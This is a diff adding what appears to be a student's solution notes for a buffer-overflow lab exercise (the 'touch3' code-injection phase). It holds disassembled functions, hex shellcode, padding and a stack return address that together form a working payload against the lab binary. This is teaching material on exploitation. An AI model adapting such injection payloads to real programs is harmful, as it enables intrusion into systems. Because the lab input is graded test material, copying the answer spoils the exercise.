@@ -1,0 +1,86 @@
+0000000000421da4 <hexmatch>:
+  421da4:	41 54                	push   %r12
+  421da6:	55                   	push   %rbp
+  421da7:	53                   	push   %rbx
+  421da8:	48 83 ec 70          	sub    $0x70,%rsp
+  421dac:	41 89 fc             	mov    %edi,%r12d
+  421daf:	48 89 f5             	mov    %rsi,%rbp
+  421db2:	e8 99 ef fd ff       	callq  400d50 <random@plt>
+  421db7:	48 89 c1             	mov    %rax,%rcx
+  421dba:	48 ba 0b d7 a3 70 3d 	movabs $0xa3d70a3d70a3d70b,%rdx
+  421dc1:	0a d7 a3 
+  421dc4:	48 f7 ea             	imul   %rdx
+  421dc7:	48 8d 04 0a          	lea    (%rdx,%rcx,1),%rax
+  421dcb:	48 c1 f8 06          	sar    $0x6,%rax
+  421dcf:	48 89 ce             	mov    %rcx,%rsi
+  421dd2:	48 c1 fe 3f          	sar    $0x3f,%rsi
+  421dd6:	48 29 f0             	sub    %rsi,%rax
+  421dd9:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
+  421ddd:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
+  421de1:	48 c1 e0 02          	shl    $0x2,%rax
+  421de5:	48 29 c1             	sub    %rax,%rcx
+  421de8:	48 8d 1c 0c          	lea    (%rsp,%rcx,1),%rbx
+  421dec:	44 89 e2             	mov    %r12d,%edx
+  421def:	be 1c 36 42 00       	mov    $0x42361c,%esi
+  421df4:	48 89 df             	mov    %rbx,%rdi
+  421df7:	b8 00 00 00 00       	mov    $0x0,%eax
+  421dfc:	e8 df ef fd ff       	callq  400de0 <sprintf@plt>
+  421e01:	ba 09 00 00 00       	mov    $0x9,%edx
+  421e06:	48 89 de             	mov    %rbx,%rsi
+  421e09:	48 89 ef             	mov    %rbp,%rdi
+  421e0c:	e8 1f ee fd ff       	callq  400c30 <strncmp@plt>
+  421e11:	85 c0                	test   %eax,%eax
+  421e13:	0f 94 c0             	sete   %al
+  421e16:	0f b6 c0             	movzbl %al,%eax
+  421e19:	48 83 c4 70          	add    $0x70,%rsp
+  421e1d:	5b                   	pop    %rbx
+  421e1e:	5d                   	pop    %rbp
+  421e1f:	41 5c                	pop    %r12
+  421e21:	c3                   	retq   
+
+0000000000421e22 <touch3>:
+  421e22:	53                   	push   %rbx
+  421e23:	48 89 fb             	mov    %rdi,%rbx
+  421e26:	c7 05 cc 36 20 00 03 	movl   $0x3,0x2036cc(%rip)        # 6254fc <vlevel>
+  421e2d:	00 00 00 
+  421e30:	48 89 fe             	mov    %rdi,%rsi
+  421e33:	8b 3d cb 36 20 00    	mov    0x2036cb(%rip),%edi        # 625504 <cookie>
+  421e39:	e8 66 ff ff ff       	callq  421da4 <hexmatch>
+  421e3e:	85 c0                	test   %eax,%eax
+  421e40:	74 1e                	je     421e60 <touch3+0x3e>
+  421e42:	48 89 de             	mov    %rbx,%rsi
+  421e45:	bf 78 36 42 00       	mov    $0x423678,%edi
+  421e4a:	b8 00 00 00 00       	mov    $0x0,%eax
+  421e4f:	e8 2c ee fd ff       	callq  400c80 <printf@plt>
+  421e54:	bf 03 00 00 00       	mov    $0x3,%edi
+  421e59:	e8 db 02 00 00       	callq  422139 <validate>
+  421e5e:	eb 1c                	jmp    421e7c <touch3+0x5a>
+  421e60:	48 89 de             	mov    %rbx,%rsi
+  421e63:	bf a0 36 42 00       	mov    $0x4236a0,%edi
+  421e68:	b8 00 00 00 00       	mov    $0x0,%eax
+  421e6d:	e8 0e ee fd ff       	callq  400c80 <printf@plt>
+  421e72:	bf 03 00 00 00       	mov    $0x3,%edi
+  421e77:	e8 6f 03 00 00       	callq  4221eb <fail>
+  421e7c:	bf 00 00 00 00       	mov    $0x0,%edi
+  421e81:	e8 6a ef fd ff       	callq  400df0 <exit@plt>
+
+
+36 38 65 32 64 39 39 61 00 # ascii of cookie 0x68e2d99a (string)
+
+22 1e 42 00 00 00 00 00 # address <touch3> 0x421e22
+
+bf 60 81 67 55 # mov 0x55678160, $edi
+68 22 1e 42 00 # pushq 0x421e22
+c3 # retq
+
+
+48 81 67 55 00 00 00 00 # address <%rsp> in <getbuf> 0x55678148
+68 81 67 55 00 00 00 00 # address <%rsp+0x20> 0x55678168
+
+bf 68 81 67 55 
+68 22 1e 42 00 
+c3 
+61 61 61 61 61 61 61 61 61 61 61 61 61 
+48 81 67 55 00 00 00 00 
+36 38 65 32 64 39 39 61 00
+# input
